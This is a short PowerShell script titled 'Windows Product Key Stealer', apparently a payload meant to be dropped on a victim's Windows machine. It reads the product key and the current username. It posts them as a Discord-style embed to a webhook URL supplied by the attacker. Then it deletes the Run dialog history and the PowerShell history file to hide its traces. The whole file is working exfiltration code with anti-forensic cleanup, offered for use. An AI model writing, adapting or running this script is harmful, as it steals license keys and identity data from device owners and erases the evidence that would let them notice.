$content = wmic path softwarelicensingservice get OA3xOriginalProductKey
$webhookUrl = "$dc"
$content = $content+"`n`nTime: $(Get-Date)`nUser: $(whoami)"
[System.Collections.ArrayList]$embedArray = @()
$title       = 'Windows Product Key Stealer'
$description = '```'+$content+'```'
$color       = '000111'
$embedObject = [PSCustomObject]@{

    title       = $title
    description = $description
    color       = $color

}
$embedArray.Add($embedObject) | Out-Null
$payload = [PSCustomObject]@{
    'username' = 'Windows Product Key'
    embeds = $embedArray
}
Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath